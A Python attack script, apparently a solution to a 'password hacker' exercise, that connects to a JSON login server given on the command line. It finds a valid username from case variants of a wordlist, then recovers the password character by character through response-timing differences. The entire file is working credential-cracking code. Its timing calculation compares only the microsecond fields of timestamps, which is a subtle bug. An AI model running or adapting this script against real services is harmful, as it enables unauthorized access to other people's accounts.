import datetime
import socket
import itertools
import sys
import string
import json
HOST = sys.argv[1]
PORT = int(sys.argv[2])
ADRESS = (HOST, PORT)
numbers = string.digits
whole_list = []
flag = False


def variant(file):
    with open(file, "r") as f:
        for pw in f.readlines():
            pw = pw.strip("\n")
            for variation in map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in pw))):
                yield variation


def send_receive(socket_, msg_):
    data = json.dumps(msg_, indent=4).encode()
    # sending through socket
    start = datetime.datetime.now()
    socket_.send(data)
    response = socket_.recv(10240)
    end = datetime.datetime.now()
    response_py = json.loads(response.decode())
    timing = end.microsecond - start.microsecond
    return [response_py, timing]


var_login = variant("logins.txt")


with socket.socket() as s:
    s.connect(ADRESS)
    while not flag:
        login = next(var_login)
        message = {"login": login,
                   "password": " "}
        result = send_receive(s, message)
        if result[0] == {"result": "Wrong password!"}:
            right_login = "".join(login)
            flag = True
            break
    flag = False
    password = ''
    pass_status = {}
    while not flag:
        password_iterator = itertools.product(string.ascii_letters + string.digits, repeat=1)
        for j in password_iterator:
            letter = ''.join(j)
            message_2 = {"login": right_login, "password": password + letter}
            try:
                pass_status = send_receive(s, message_2)
            except ConnectionResetError:
                pass
            except ConnectionAbortedError:
                pass
            if pass_status[0] == {"result": "Connection success!"}:
                password += letter
                flag = True
                break
            if pass_status[1] >= 90000:
                password += letter

result = {"login": right_login, "password": password}
print(json.dumps(result, indent=4))

